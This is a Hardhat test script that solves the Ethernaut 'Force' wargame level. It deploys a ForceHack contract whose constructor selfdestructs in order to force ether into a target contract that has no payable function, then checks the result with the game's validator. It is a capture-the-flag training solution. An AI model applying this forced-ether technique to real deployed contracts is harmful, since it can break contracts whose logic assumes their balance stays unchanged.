import { expect } from "chai";
import { ethers } from "hardhat";

describe("Delegation exploit", () => {
  it("Should increase the balance of Force", async () => {
    const [deployer, attacker] = await ethers.getSigners();
    const ForceFactory = await ethers.getContractFactory("ForceFactory");
    const forceFactory = await ForceFactory.connect(deployer).deploy();
    await forceFactory.deployed();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const forceFactoryAddress = await forceFactory.connect(attacker).callStatic.createInstance(attacker.address);

    const tx = await forceFactory.connect(attacker).createInstance(attacker.address);
    await tx.wait(1);

    // Load the instance at returned address
    const force = await ethers.getContractAt("Force", forceFactoryAddress);

    const ForceHack = await ethers.getContractFactory("ForceHack");

    // Deploy the ForceHack contract.
    // "selfdestruct" function in the constructor will send ether stored in the contract to the supplied address.
    const forceHack = await ForceHack.connect(attacker).deploy(force.address, {
      value: ethers.utils.parseUnits("1", "wei"),
    });
    await forceHack.deployed();

    // Validate the instance using Ethernaut validation.
    const success = await forceFactory.connect(attacker).validateInstance(force.address, attacker.address);
    expect(success).to.be.true;

    // Assert Force's contract balance is greater than zero.
    const balance = await ethers.provider.getBalance(force.address);
    expect(balance.gt(0)).to.be.true;
  });
});
